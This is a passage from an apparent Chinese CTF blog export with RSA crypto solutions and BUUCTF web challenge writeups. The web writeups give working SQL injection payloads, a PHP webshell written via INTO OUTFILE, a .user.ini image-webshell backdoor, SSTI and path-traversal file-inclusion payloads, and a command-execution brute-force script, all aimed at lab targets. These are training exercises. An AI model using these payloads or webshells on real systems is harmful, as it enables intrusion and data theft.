128363031923139297392077349407719417788135630403499671848196425800900870531452570499668481104884553795224784931947824885511134525485570129640119439950191944938407656926280993408854767711557863016197167505998324659906146937423415404059310560359693643987781862684489401368519777953281060013045590132161625607377\nc= 4176193749773450562408160796325873473193702511560805285554329767573726211097194419198463203488792792756598428753745425419950423161673497255820731183746106463781291156892140581651301528184812357534808298071893380519977926677138246941946185699346532140641376461516107672722425971178865758049759985915001009787241295292157744353554548314911531918044654676691927347018033509499136103964942830581407087547565204232556314726045307279963709599952745342811947421707024572981812906869557834491207590418553244020621858083633564878305733114484857827620268881100166090837841224767358579366482347136224695333980041913268394994302\n```\nexp：\n```python\ndef decrypt(dp,dq,p,q,c):\n    InvQ = gmpy2.invert(q, p)\n    mp = pow(c, dp, p)\n    mq = pow(c, dq, q)\n    m = (((mp-mq)*InvQ) % p)*q+mq\n    print libnum.n2s(m)\n\ndp= 24417628139330679432551095868116968814142396193102639509841676574931690513464588523684381397207121003439385360929299071710433231196678202942915347185802024747158497456267595000613289619481116892073493417896024118597833611923086327107489774162727006791982668721110819684552525393969199138125692085053266311867\ndq= 39019112110614280252241495036646034807151213716557526376274345944263453299622818575225245299195523420254672088668617876062998490653404750105272510633841394184860866942704080992475543547501372565259180366123356119418623253283732615682878021900318153700726522250094020806743598752556541454865233668070931534349\np= 114461439704891616590422134857421869878753559940962522699708885701308630438427731936479777010552391068812199529467348873013239528376604282404207321401876195560830474695517139918118078685078197948576662138382523308600480733574419071424466292785993331731881271557573094521160051353184489095799816579282742140953\nq= 173407999660109485520889209734134041910836523881475540116955713891631837403964097088089751678165465931150331234455699896350201315926126639981461748491240790317968076899655657331112140939100897570439934688992874242416328330344836429844042122956843979375681077968897817612357468397424082494911472122421034561779\nc= 13156088528156801357013836665002509320288819562687150049688430847488062217199478847649128772442129783962344653461951822569890099822350753026372449754819799394899656016487248023042927376134885257136511477879900672582593964626335310995748816166750941755394630154620318544805488209700324391789948495807096701620546557726907853315159542234979480907794659188799145765761654813882682456135251746607111274015475601810166327843158879230660349983897375641623569327757258851636029354634714133778666281729500815659100876558161468140039778498553902396380237570072543395294246750182054410091138654202418836971487515663618000662737\ndecrypt(dp,dq,p,q,c)\n```\n```\nflag{dp_dq_is_very_dangerous!_47325684736584}\n```\n### 共模攻击\n\neg:\n```python\nc1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361\nn=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801\ne1=11187289\nc2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397\ne2=9647291\n```\nexp:\n```python\n#-*-coding:utf-8 -*-\nfrom gmpy2 import *\nimport libnum\n\nn=22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801\ne1=11187289\ne2=9647291\ns = gcdext(e1, e2) #e1*s1+e2*s2 = 1\ns1 =  s[1]\ns2 = -s[2]\n\nc1=22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361\nc2=18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397\nc2 = invert(c2, n) \n'''\n我们知道解出来s2是负数。\n而在数论模运算中，要求一个数的负数次幂，与常规方法并不一样。\n比如此处要求c2的s2次幂，就要先计算c2的模反元素c2'，然后求c2'的s2次幂。\n'''\nm = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n   # m=(c1^s1*c2^s2)%n\nprint libnum.n2s(m)\n```\n```\nflag{49d91077a1abcb14f1a9d546c80be9ef}\n```\n[RSA 共模攻击 Isc2016——PhrackCTF](https://www.jianshu.com/p/9b44512d898f)\n\n\n\n\n\n```python\nfrom Crypto.Util.number import*\nimport gmpy2\nfrom tqdm import tqdm\n\ndef get_p(p_low, mod):\n    F.<z> = PolynomialRing(Zmod(N))\n    f = mod * z + p_low\n    f = f.monic()\n    res = f.small_roots(beta=0.44, epsilon= 1/28)\n\n    if len(res) > 0:\n        return 1, res[0]\n    return 0, 0\n\ndp_low = 1642122247947767590084047512154856959705749371720710428047250478126321193705946117104552307567185209952017\nN = 53290208062987048378703574235428685467319210471478014757229530639473548433668122104609082311237893278140109351209752453324855439700478949142631006593125874482133364050198292529339327668306943207846561273907830779959709641714284066463679953568692820076085446240980505949826504849495848235048490118010959579651\nc =  12164583901228226723569831803555747425419794714331207509347997795520206866173813478558747259319024376651968008838562856265966903471803669392265118265704723742518812401306445616633449971845569756343283456918105040589961351125414282181230864299705837250020888494290318050869813023592249838047791552928679622761\ne = 0x10001\nmod = 2^351\n\ntag = 0\nfor k in tqdm(range(1, e + 1)):\n    p = var('p')\n    p_low = solve_mod([e * dp_low == 1 + k * (p - 1)], mod)\n    if len(p_low) != 0:\n        # print(p_low)\n        for i in range(len(p_low)):\n            result = get_p(int(p_low[i][0]), mod)\n            if result[0]:\n                p = int(mod * result[1] + int(p_low[i][0]))\n                print(p)\n                tag = 1\n                break\n    if tag == 1:\n        break\nq = N // p\nphi = (p-1) * (q-1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, N)\nprint(long_to_bytes(m).decode())\n\n```\n\n","tags":["Crypto"],"categories":["CTF"]},{"title":"BUUCTF-Web-WriteUp","url":"/posts/9796.html","content":"### WarmUp【2018-HCTF】\n\n**知识点**：代码审计，phpmyadmin任意文件包含漏洞\n**参考**：[phpmyadmin 4.8.1任意文件包含](https://blog.51cto.com/13770310/2131305?source=dra)\n\n**涉及函数**：[$_REQUEST](https://www.php.net/manual/zh/reserved.variables.request.php)  , [in_array()](https://www.php.net/manual/zh/function.in-array.php) , [mb_substr()](https://www.php.net/manual/zh/function.mb-substr.php) , [mb_strpos()](https://www.php.net/manual/zh/function.mb-strpos.php)\n\n打开题目查看源码，发现`source.php`,跟进得到源码\n```php\n <?php\n    highlight_file(__FILE__);\n    class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n\n    if (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    } else {\n        echo \"<br><img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" />\";\n    }  \n?> \n```\n代码审计，`whitelist数组`里有另一个元素`hint.php`，进去看看,提示了`flag`存储的位置\n```\nflag not here, and flag in ffffllllaaaagggg\n```\n关键代码：\n```php\nif (! empty($_REQUEST['file'])\n        && is_string($_REQUEST['file'])\n        && emmm::checkFile($_REQUEST['file'])\n    ) {\n        include $_REQUEST['file'];\n        exit;\n    }\n```\n\n即满足这三个条件才能够包含(`include$_REQUEST['file']`)\n```php\n$ _REQUEST[‘file’]不为空\n$ _REQUEST[‘file’]为字符串\nemmm::checkFile($_REQUEST[‘file’])返回值为真。\n```\n\n分析`emmm::checkFile()`这个函数\n\n```php\n  class emmm\n    {\n        public static function checkFile(&$page)\n        {\n            $whitelist = [\"source\"=>\"source.php\",\"hint\"=>\"hint.php\"];\n            if (! isset($page) || !is_string($page)) {\n                echo \"you can't see it\";\n                return false;\n            }\n\n            if (in_array($page, $whitelist)) {\n                return true;\n            }\n\n            $_page = mb_substr(\n                $page,\n                0,\n                mb_strpos($page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n\n            $_page = urldecode($page);\n            $_page = mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . '?', '?')\n            );\n            if (in_array($_page, $whitelist)) {\n                return true;\n            }\n            echo \"you can't see it\";\n            return false;\n        }\n    }\n```\n1.首先设置了一个白名单，只包含source.php和hint.php，第一个if检查是否存在$page并且是否为字符串。\n\n2.检查`$page`是否在白名单中，是的话返回true。接下来，两个函数一个`mb_substr`和`mb_strpos`,意思就是截取`$page`中`?`前面的字符串，然后再进行白名单校验。\n\n3.在`url解码`后的`$page`的`?`前面是否在`whitelist`里面\n\n**构造payload**：\n**0x01**:首先构造`?file=source.php`,满足上述第一点\n**0x02**:再构造`?file=source.php?`,满足上述第二点\n**0x03**:接着构造`?file=source.php%253f`,满足上述第三点\n（由于服务器会自动解码一次，所以在checkFile()中，$page的值一开始会是source.php%3f，urldecode解码后变成了source.php?，这次便符合了?前内容在白名单的要求，函数返回true)\n**0x04**:最后通过目录穿越的到ffffllllaaaagggg里面的内容，也就是flag。\n\n**playload**:`http://10d57afd-7622-4cda-b0be-af3d90f1cce0.node1.buuoj.cn/?file=source.php%253f/../../../../ffffllllaaaagggg`\n### 随便注(三种解题思路)【2019-强网杯】\n\n**知识点**：SQL注入-堆叠注入,sql预处理语句,巧用contact()函数绕过\n**参考**：\n[SQL注入-堆叠注入](https://www.cnblogs.com/0nth3way/articles/7128189.html)\n[SQL Injection8(堆叠注入)——强网杯2019随便注](https://blog.csdn.net/qq_26406447/article/details/90643951)\n[[Writeup]BUUCTF_Web_随便注](https://blog.csdn.net/m0_38100569/article/details/99617762)\n[MySQL的SQL预处理(Prepared)](https://www.cnblogs.com/geaozhang/p/9891338.html)\n[利用Mysql into outfile给网站留后门](https://blog.csdn.net/xlxxcc/article/details/52637873)\n[shell处理mysql增、删、改、查](https://www.cnblogs.com/iforever/p/4459857.html)\n**堆叠注入原理**:\n\n>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在分号（;）结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。\n>用户输入：1; DELETE FROM products\n>服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products\n>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除\n\n#### 方法一：重命名+堆叠注入\n打开题目，显示如下界面，观察后猜测是sql注入\n![](https://i.loli.net/2019/08/28/yTUh6sbCqM3G8WS.png)\n**0x01**:判断是否存在注入，注入是字符型还是数字型\n输入`1'`发现不回显\n输入`1' #`显示正常\n应该是存在sql注入了\n\n输入`1' or '1'='1`,正常回显，应该是字符型\n![](https://i.loli.net/2019/08/28/qsztpRjnILPS2XW.png)\n**0x02**:猜解SQL查询语句中的字段数\n输入`1' order by 1 #` 成功回显\n![](https://i.loli.net/2019/08/28/5xkTzpm7WFOynQu.png)\n输入`1' order by 2 #` 成功回显\n![](https://i.loli.net/2019/08/28/Ihoia7WQUtgqOVk.png)\n输入`1' order by 3 #` 回显错误\n![](https://i.loli.net/2019/08/28/U3bwZmfLW5YOpjT.png)\n所以只有两个字段\n**0x03**:显示字段\n输入`1′ union select 1,2 #` 回显一个正则过滤规则\n![](https://i.loli.net/2019/08/28/GRpkovDcU9lrWeh.png)\n过滤了 select，update，delete，drop，insert，where 和 点\n\n过滤了这么多词，是不是有堆叠注入？尝试堆叠注入\n**0x04**：查询数据库\n输入`1';show databases;#` 成功回显\n![](https://i.loli.net/2019/08/28/yIRHmeSopaTLNOv.png)\n说明存在堆叠注入\n**0x05**：查询表\n输入`1';show tables;#` 成功回显\n![](https://i.loli.net/2019/08/28/ibI8D6pQWCzO1hT.png)\n得到两个表`words`和`1919810931114514`\n**0x06**：查询表中字段\n**坑点：mysql中点引号( ' )和反勾号( ` )的区别**\n```\nlinux下不区分，windows下区分\n区别:\n单引号( ' )或双引号主要用于字符串的引用符号\neg：mysql> SELECT 'hello', \"hello\" ;\n\n反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键]\neg:`mysql>SELECT * FROM   `table`   WHERE `from` = 'abc' ;\n```\n输入``1'; show columns from `words`; #``   字段使用的是反勾号（ ` ）\n\n![](https://i.loli.net/2019/08/28/YxopCSVfOJ8caGL.png)\n输入``1'; show columns from `1919810931114514`; #``  字段使用的是反勾号（ ` ）\n\n![](https://i.loli.net/2019/08/28/muEBnptX1NoMjPw.png)\n可以看到`1919810931114514`中有我们想要的`flag`字段\n现在常规方法基本就结束了，要想获得flag就必须来点骚姿势了\n因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢\n内部查询语句类似 :` select id, data from word where id = `\n\n他既然没过滤 alert 和 rename，那么我们是不是可以把表改个名字，再给列改个名字呢。\n先把 words 改名为 words1，再把这个数字表改名为 words，然后把新的 words 里的 flag 列改为 id （避免一开始无法查询）。\n**payload:**\n\n```sql\n1';RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#\n```\n\n![](https://i.loli.net/2019/08/28/miPt4rXApufY9G2.png)\n接着输入`1' or '1'='1 `,查询就得到flag\n![](https://i.loli.net/2019/08/28/r5gcJfmvNEWAZ7V.png)\n\n#### 方法二：预处理语句+堆叠注入\n预处理语句使用方式：\n```sql\nPREPARE name from '[my sql sequece]';   //预定义SQL语句\nEXECUTE name;  //执行预定义SQL语句\n(DEALLOCATE || DROP) PREPARE name;  //删除预定义SQL语句\n```\n预定义语句也可以通过变量进行传递:\n```sql\nSET @tn = 'hahaha';  //存储表名\nSET @sql = concat('select * from ', @tn);  //存储SQL语句\nPREPARE name from @sql;   //预定义SQL语句\nEXECUTE name;  //执行预定义SQL语句\n(DEALLOCATE || DROP) PREPARE sqla;  //删除预定义SQL语句\n```\n本题即可利用`char()`方法将`ASCII码`转换为`SELECT`字符串，接着利用`concat()`方法进行拼接获得查询的`SQL语句`，来绕过过滤或者直接使用`concat()`方法绕过\n```sql\nchar（）根据ASCII表返回给定整数值的字符值\neg:\nmysql> SELECT CHAR(77,121,83,81,'76');\n-> 'MySQL'\n\ncontact（）函数用于将多个字符串连接成一个字符串\ncontact (str1,str2,…) \neg:\nmysql> SELECT CONCAT('My', 'S', 'QL');\n-> 'MySQL'\n```\n`char(115,101,108,101,99,116)<----->'select'`\n**payload1：**不使用变量\n``1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#``\n输入`payload1`直接得到flag\n![](https://i.loli.net/2019/08/28/wyLg4p6ME9eOcnK.png)\n\n**payload2：**使用变量\n``1';SET @sql=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE jwt from @sql;EXECUTE jwt;#``\n\n输入`payload2`直接得到flag\n![](https://i.loli.net/2019/08/28/kLo1pesBAcyunlg.png)\n**payload3：**只是用contact(),不使用char()\n``1';PREPARE jwt from concat('s','elect', ' * from `1919810931114514` ');EXECUTE jwt;#``\n![](https://i.loli.net/2019/08/28/mDUI8eLkXMsoEJ3.png)\n#### 方法三：利用命令执行Getflag\n查询了一下用户竟然是root\n```sql\n1';Set @sql=concat(\"s\",\"elect user()\");PREPARE sqla from @sql;EXECUTE sqla;\n```\n![](https://i.loli.net/2019/08/28/n9S8IDwghoOfKT5.png)\n那么写个执行命令的shell吧（绝对路径猜的,一般是服务器网站根目录/var/www/html）\n```sql\n1';Set @sql=concat(\"s\",\"elect '<?php @print_r(`$_GET[1]`);?>' into outfile '/var/www/html/1\",char(46),\"php'\");PREPARE sqla from @sql;EXECUTE sqla;\n```\n利用`char(46)`<==>`.`从而绕过关键词`.`过滤\n>Mysql into outfile语句，可以方便导出表格的数据。同样也可以生成某些文件。因此有些人会利用sql注入生成特定代码的文件，然后执行这些文件。将会造成严重的后果。\nMysql into outfile 生成PHP文件\nSELECT 0x3C3F7068702073797374656D28245F524551554553545B636D645D293B3F3E into outfile '/var/www/html/fuck.php'\n最后会在/var/www/html/路径下， 生成fuck.php文件\n这里不走寻常路，执行打算利用我们的shell查询flag（账号密码直接读取首页就可以看到）\n\n\n利用一句话木马执行任意mysql命令（双引号中的内容会被当做shell命令执行然后结果再传回来执行）\n`uroot:`用户名root `proot:`密码root\n```sql\n/1.php?1=mysql -uroot -proot -e \"use supersqli;select flag from \\`1919810931114514\\`;\"\n```\n![](https://i.loli.net/2019/08/28/2tyPZaNCmpAoq3l.png)\n### EasySQL【2019-SUCTF】\n**知识点**：堆叠注入，sql_mode 实现字符串管道‘||’连接\n题目和2019-强网杯随便注一样是一个堆叠注入，不过做了更多限制。\n查看大佬Wp,比赛时`.index.php.swp`存在源码泄露\n```sql\n1;show databases;show tables; #查库和表    \n```\n![](https://i.loli.net/2019/08/31/VqxCT1LpIHdAblB.png)\n```php\n<?php\n    session_start();\n\n    include_once \"config.php\";\n\n    $post = array();\n    $get = array();\n    global $MysqlLink;\n\n    //GetPara();\n    $MysqlLink = mysqli_connect(\"localhost\",$datauser,$datapass);\n    if(!$MysqlLink){\n        die(\"Mysql Connect Error!\");\n    }\n    $selectDB = mysqli_select_db($MysqlLink,$dataName);\n    if(!$selectDB){\n        die(\"Choose Database Error!\");\n    }\n\n    foreach ($_POST as $k=>$v){\n        if(!empty($v)&&is_string($v)){\n            $post[$k] = trim(addslashes($v));\n        }\n    }\n    foreach ($_GET as $k=>$v){\n        }\n    }\n    //die();\n    ?>\n\n<html>\n<head>\n</head>\n\n<body>\n\n<a> Give me your flag, I will tell you if the flag is right. </a>\n<form action=\"\" method=\"post\">\n<input type=\"text\" name=\"query\">\n<input type=\"submit\">\n</form>\n</body>\n</html>\n\n<?php\n\n    if(isset($post['query'])){\n        $BlackList = \"prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|\\\"\";\n        //var_dump(preg_match(\"/{$BlackList}/is\",$post['query']));\n        if(preg_match(\"/{$BlackList}/is\",$post['query'])){\n            //echo $post['query'];\n            die(\"Nonono.\");\n        }\n        if(strlen($post['query'])>40){\n            die(\"Too long.\");\n        }\n        $sql = \"select \".$post['query'].\"||flag from Flag\";\n        mysqli_multi_query($MysqlLink,$sql);\n        do{\n            if($res = mysqli_store_result($MysqlLink)){\n                while($row = mysqli_fetch_row($res)){\n                    print_r($row);\n                }\n            }\n        }while(@mysqli_next_result($MysqlLink));\n\n    }\n\n    ?>\n```\n过滤了prepare|flag||where|from|union|update|delete|if||or|and|等，还有长度限制,不能超过40\n查询语句结构：`select \".$post['query'].\"||flag from Flag`\n因此可以直接输入`*,1`拿到flag\n```\nselect *,1||flag from Flag\n```\n因为`1||flag == 1`，然后可以查询Flag表里所有内容。\n![](https://i.loli.net/2019/08/31/BQc13pKDa6PdNXY.png)\n**方法二**：\n参考：[SUCTF Web部分](http://www.sketchplane.top/2019/08/23/SUCTF-Web%E9%83%A8%E5%88%86/)\n原理：[mysql 修改sql_mode 实现字符串管道‘||’连接](https：//blog.csdn.net/lixora/article/details/60572357)\n本地测试`sql_mode`\n![来源于参考](https://i.loli.net/2019/08/31/3zL8hWTiPyqkRmj.png)\n通过||来实现字符串拼接，设置`sql_mode模式为pipes_as_concat`即可。即：\n```\n1;set sql_mode=pipes_as_concat;select 1\n```\n![](https://i.loli.net/2019/08/31/ytJ3gBWHSnquakV.png)\n### CheckIn【2019-SUCTF】\n**知识点**：文件上传，.user.ini文件构成的PHP后门,GIF89a绕过图片检测\n参考：[.user.ini文件构成的PHP后门](https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html)\n[从SUCTF 2019 CheckIn 浅谈.user.ini的利用](https://xz.aliyun.com/t/6091)\n题目是一个文件上传，可以上传jpg、png等文件，但是限制了php，文件内容不能包含`<?`,但可以上传`<script language='php'><scirpt>`类型的图片马来绕过。其次还判断了上传的文件头，使用exif_image来判断的，这个很容易绕过，直接随便加一个图片文件头就行，添加最简单的`gif文件头GIF89a`,并且上传之后会给出文件所在目录\n本题是利用`.user.ini`来上传php后门\n![](https://i1.100024.xyz/i/2019/09/01/rbld7o.png)\n\n看过`.user.ini`的分析后我们的思路应该比较清晰了，我们可以上传一个这样的`.user.ini：`\n```\nGIF89a\nauto_prepend_file=1.jpg\n```\n![](https://i.loli.net/2019/09/01/uJH6XQzNeYRtwSs.png)\n此时我们注意到上传目录下还有一个index.php，我们正好需要该目录下有一个可执行php文件，那么正好满足`.user.ini`的条件\n然后再上传一个图片马1.jpg：\n```\nGIF89a\n<script language='php'>system('cat /flag');</script>\n```\n![](https://i.loli.net/2019/09/01/1HWACqNelynhjTg.png)\n我们访问`uploads/fd40c7f4125a9b9ff1a4e75d293e3080/index.php`即可得到flag\n### Hack World【2019-CISCN-华北赛区】\n**知识点**：布尔盲注\n直接给出了表名flag和字段名flag\n布尔盲注，使用异或即可\n过滤了空格，可以使用tab或者()\n\n### easy_tornado【2018-护网杯】\n**知识点**：服务端模板注入攻击 （SSTI）\n参考：\n[Python Web 框架:Tornado](https://blog.csdn.net/xc_zhou/article/details/80637714)\n[render函数介绍](https://blog.csdn.net/qq78827534/article/details/80792514)\n[SSTI服务器模板注入](https://uuzdaisuki.com/2018/05/28/SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/)\n[服务端模板注入攻击 （SSTI）之浅析 ](https://www.freebuf.com/vuls/83999.html)\n根据题目`easy tornado`搜索`tornado`发现是python中的一个web应用框架。\n\n打开题目发现有三个文件\n![](https://i.loli.net/2019/09/14/hJBRtMvmVGbEuc3.png)\nflag.txt\n```\n/flag.txt\nflag in /fllllllllllllag\n```\n\n发现flag在/fllllllllllllag文件里\n\nwelcome.txt\n```\n/welcome.txt\nrender\n```\nrender是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。\nhints.txt\n```\n/hints.txt\nmd5(cookie_secret+md5(filename))\n```\n`filename=/fllllllllllllag`，只需要知道`cookie_secret`的就可以访问flag了\n\n输入`filename=/fllllllllllllag`测试后发现还有一个error界面，格式为`/error?msg=Error`，加之`render函数`,所以怀疑存在`服务端模板注入攻击(SSTI)`\n![](https://i.loli.net/2019/09/14/eLHYmIvg7xCT9B1.png)\n构造payload,验证是否存在注入\n```\n/error?msg={{3}}\n```\n![](https://i.loli.net/2019/09/14/IYUyBPjF7wgQqVl.png)\n页面显示3，说明存在模板注入\n\n通过查阅文档发现`tornado`的`cookie_secret`在`handler.settings`中\n构造payload获取cookie_secret\n```\n/error?msg={{handler.settings}}\n```\n![](https://i.loli.net/2019/09/14/PbQ4Y2ThlpHjIEf.png)\n在线计算filehash值或者脚本计算\n```python\nimport hashlib\n\ndef md5(s):\n md5 = hashlib.md5() \n md5.update(s) \n return md5.hexdigest()\n\nfilename = '/fllllllllllllag'\ncookie_secret = 'b3462331-240d-4d61-9941-ce05616520e3'\nprint(md5(cookie_secret+md5(filename)))\n```\n![](https://i.loli.net/2019/09/14/glQe2aAXTjYhMdZ.png)\npayload：\n```\n?filename=/fllllllllllllag&filehash=d36c1cd33fb729d2a7d1084c51c30d28\n```\n![](https://i.loli.net/2019/09/14/1XtgGxY9mLfKBR3.png)\n### 高明的黑客【2019-强网杯】\n**知识点**：代码审计，动态测试\n![](https://i.loli.net/2019/09/14/XPZmOqSxHILG9rz.png)\n下载`www.tar.gz`\n下载下来之后发现有三千多个php文件,随意打开几个文件，发现了类似命令执行漏洞。\n![](https://i.loli.net/2019/09/14/seDiF4YyVf5U8kZ.png)\n但只有一个是真正可以执行的\n将每个php文件里的`$ _GET`参数提取出来逐个爆破就行了\n代码参考网上大佬的\n```python\n# coding:utf-8\n#!/usr/bin/env python3\nimport requests\nimport os\nimport re\nurl = 'http://d65fe37f-f9c3-4b4a-ba25-cb8b0dfdd28b.node1.buuoj.cn/'\nptn = re.compile(br\"\\$_GET\\['(\\w+)'\\]\")\nptn1 = re.compile(br'>>> (\\w+) !!!')\ni = 0\nfor f in list(os.scandir('C:/Users/admin/Desktop/src'))[::-1]:\n    i += 1\n    print(i, end='\\r')\n    with open(f.path, 'rb') as fp:\n        data = fp.read()\n    for get in set(ptn.findall(data)):\n        get = get.decode('ascii')\n        cmd = 'echo \">>> %s !!!\";' % get\n        r = requests.get(url + f.name, params={get: cmd})\n        if ptn1.search(r.content) is not None:\n            print()\n            print(f.name, get)\n            exit()\n```\n![](https://i.loli.net/2019/09/14/HwuUE51vdAqC7t2.png)\npayload：\n```\n/xk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n![](https://i.loli.net/2019/09/14/EslpMk4J8mbSvTG.png)\n### Fakebook【2018-网鼎杯】\n**知识点**：SSRF，反序列化，报错注入\n打开题目，发现Web应用有两个功能。一个是登录，一个是注册，如下：\n![](https://i.loli.net/2019/09/14/twxP9J18fknRaNT.png)\n发现注册的时候blog处只能写url链接\n![](https://i.loli.net/2019/09/14/5gs7G1w8FXazUoZ.png)\n而且在查看用户信息的时候，发现Web应用加载了用户的blog网页，这里就存在SSRF漏洞。\n![](https://i.loli.net/2019/09/14/EFxpyChgWovInA4.png)\n查看`robots.txt`,得到`user.php.bak`发现有源码泄露，扫描得到flag.php\n\n```php\n<?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this->name = $name;\n        $this->age = (int)$age;\n        $this->blog = $blog;\n    }\n\n    function get($url)\n    {\n        $ch = curl_init();\n\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n        $output = curl_exec($ch);\n        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);\n        if($httpCode == 404) {\n            return 404;\n        }\n        curl_close($ch);\n\n        return $output;\n    }\n\n    public function getBlogContents ()\n    {\n        return $this->get($this->blog);\n    }\n\n    public function isValidBlog ()\n    {\n        $blog = $this->blog;\n        return preg_match(\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i\", $blog);\n    }\n\n}\n```\n审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。\n\n查看用户信息界面存在SQL注入，直接使用报错注入，会发现数据库里面只有用户的注册信息：\n爆表名\n```mysql\n/view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#\n```\n\n![](https://i.loli.net/2019/09/14/gIvXkwe1DVjGq32.png)\n爆列名\n```mysql\n/view.php?no=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1)#\n```\n![](https://i.loli.net/2019/09/14/2IaBDt1OVlPmCdJ.png)\n爆字段\n```mysql\n/view.php?no=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#\n```\n![](https://i.loli.net/2019/09/14/Wxw6LapcRS9rduE.png)\n这里发现data字段存放的是用户信息经过反序列化的结果，\n结合前面 view.php 页面会加载用户的blog信息，\n所以这里极有可能是利用反序化数据库中的data字段，然后取出url字段并加载，\n因此利用no参数进行注入，在反序列化中构造file文件协议，\n利用`服务端请求伪造漏洞`访问服务器上的flag.php文件\n所以我们要做的就是将SQL语句查询结果中data字段反序列化后，内容中的url等于flag.php即可。所以我们构造SQL语句如下：\n过滤了union select用/ ** 